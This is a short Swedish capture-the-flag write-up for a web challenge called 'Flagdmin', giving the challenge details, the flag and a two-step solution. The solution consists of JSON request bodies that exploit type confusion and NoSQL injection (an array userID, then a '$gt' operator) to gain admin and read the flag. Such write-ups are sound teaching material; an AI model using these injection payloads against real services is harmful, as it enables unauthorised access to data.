# Web: Flagdmin

- **Skapare:** Kelvin Szolnoky
- **Poäng:** 250
- **Antal lösningar:** 7

## Beskrivning

Built with modern node.js, redis, typescript and all the good technologies, this is the service for all admins to get their flags.

http://35.228.52.143:6969/

Given fil: src/app.ts

## Flagga

SSM{nO_n0_pL332_DOn7_no5QL1}

## Lösning

Skicka följande post request (body) till /api/login

```json
{
  "userID": ["test_user_id", "admin"]
}
```

Detta kommer göra test_user_id till admin. test_user_id kan sättas till vilken sträng som helst.

Skicka följande post request (body) till /api/get/flag

```json
{
  "userID": "test_user_id",
  "flagID": { "$gt": "" }
}
```

Detta kommer hämta det första dokumentet i databasen, vilket är flaggan

